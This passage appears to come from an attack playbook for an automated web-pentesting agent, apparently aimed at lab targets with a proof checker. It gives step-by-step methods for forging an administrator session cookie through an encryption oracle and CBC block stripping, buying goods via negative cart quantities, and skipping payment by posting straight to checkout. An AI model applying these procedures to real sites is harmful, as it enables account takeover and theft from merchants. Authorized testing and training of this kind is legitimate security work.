Block-stripping arithmetic: the fixed prefix 'Invalid email address: ' is exactly 23 bytes. AES-128-CBC block size is 16. To push the prefix into full blocks: 23 + 9 = 32 = 2 * 16. So prepend exactly 9 filler characters (any ASCII) to the desired plaintext before sending as the email value. After receiving the ciphertext, drop the first 32 bytes (indices 0-31) to remove both prefix blocks. The byte manipulation must be done on raw bytes AFTER Base64-decode and BEFORE re-encoding. URL-decoding must happen before Base64-decoding (the cookie is URL-encoded in the Set-Cookie header). The timestamp TS must be copied exactly as-is from the decrypt oracle output — it is a Unix millisecond timestamp as a decimal string. Do not regenerate it; use the one extracted from the decrypted stay-logged-in value so the forged cookie matches the server's expected format. If the decrypt oracle shows a garbled first block in step 6 (expected for CBC bit-flip on first block after stripping), that is acceptable as long as bytes 17 onward decode cleanly to 'administrator:TS' — the server only checks the username:timestamp format, not the leading garbage, because the first block of the remaining ciphertext will always be garbled after block removal (CBC IV propagation). If the server validates the full plaintext strictly, an additional round of padding adjustment on the filler count may be needed to align block boundaries perfectly.

---

## Negative Quantity / Refund Abuse (BLF-06)
**Pattern:** BLF-06

### Vulnerability
The cart/order endpoint accepts a signed integer for the `quantity` parameter with no lower-bound check. The server computes the cart total as `sum(price_i * quantity_i)`, so a sufficiently large negative quantity on a cheap item offsets the total below the user's store credit. Unlike BLF-02 (which uses two different productIds), BLF-06 typically targets a refund/return endpoint where quantity=-N is the intended API but no ownership or minimum check is enforced. Also occurs when a single-item cart trick fails but a two-item cart (expensive item + negative cheap item) works.

### Signals (detectable from recon)
- POST /cart (or /order, /basket) has a `quantity` field with no explicit minimum constraint (no `min="1"` attribute in the HTML form).
- The cart has a running total visible via GET /cart — allows verifying the tamper effect before checkout.
- No 4xx error is returned when quantity=-1 is submitted — server accepts negative values.
- The application has both a high-price item (target) and a lower-price item (negative-quantity vehicle).

### Discovery Steps (before attacking)
1. Identify the cart POST endpoint and confirm `quantity` is a form field (not server-derived).
2. Add the target expensive item (qty=1), then try POSTing a negative quantity for a different cheap item. Check GET /cart to see if the total decreased.
3. Calculate the required negative quantity: `N = ceil((target_price - store_credit) / cheap_item_price)`. Add cheap item at qty=-N and confirm the cart total is within store credit.
4. Proceed to POST /cart/checkout. If a 303 redirect is returned, follow the `redirect_location` to the confirmation page.

### Key Field Names
- `quantity (signed integer — no minimum validation)`
- `productId (must use TWO different productIds: expensive target + cheap negative-qty vehicle)`
- `redir (typically CART or PRODUCT — controls redirect destination after add)`
- `csrf (required for /cart/checkout POST)`

### Exec Notes
The two-productId trick is critical: quantity=-1 on the SAME expensive item just removes it (net qty=0). The exploit requires adding the expensive item at qty=1 AND a DIFFERENT cheap item at a large negative quantity so the total is affordable. After POST /cart with negative qty returns 302, always do GET /cart immediately to confirm the negative total is reflected. Then POST /cart/checkout — follow the 303 `redirect_location` to the order confirmation page. ProofGate requires `order_created=True`: the exec agent MUST follow the redirect and GET the confirmation URL.

---

## Multi-Step Process Bypass / Insufficient Workflow Validation (BLF-09)
**Pattern:** BLF-09

### Vulnerability
The application's checkout/order workflow has multiple steps (browse → add to cart → enter payment → confirm order), but the server does not validate that prior steps were completed before processing the final step. An attacker with an item in their cart can POST directly to the checkout confirmation endpoint, bypassing any payment or credit-check intermediate step. The server processes the order purely because a valid CSRF token and cart state exist, without verifying the payment workflow was followed.

### Signals (detectable from recon)
- A checkout/order-confirm endpoint exists (POST /cart/checkout, POST /order/confirm) AND an add-to-cart endpoint also exists.
- No payment gateway redirect or intermediate `/payment` endpoint is required before checkout.
- The checkout endpoint accepts only a CSRF token as its body parameter — no payment nonce, card token, or shipping confirmation required.
- Submitting directly to the checkout endpoint from a fresh session (with the item in the cart) returns an order confirmation.

### Discovery Steps (before attacking)
1. Add the target item to cart via POST /cart or equivalent.
2. Without going through any intermediate steps, POST directly to /cart/checkout with only the CSRF token scraped from GET /cart.
3. Check the response: if 303/302 to an order confirmation page, the workflow bypass succeeded.
4. Follow the `redirect_location` header to GET the confirmation page.

### Key Field Names
- `csrf (scraped from GET /cart form — required)`
- `POST /cart/checkout (or /order/confirm, /checkout/complete — the final step endpoint)`
- `redirect_location (from the 303 response — follow this to get the confirmation page)`

### Exec Notes
This is structurally the simplest BLF exploit: add item to cart, POST to checkout with csrf, follow the redirect. The key is to NOT do any intermediate payment steps — the bypass is proved by the absence of those steps combined with a successful order. ProofGate checks `order_created=True` via the confirmation page. Always follow the `redirect_location` after the 303 — exec must GET the confirmation URL to populate the order_created fact.

---
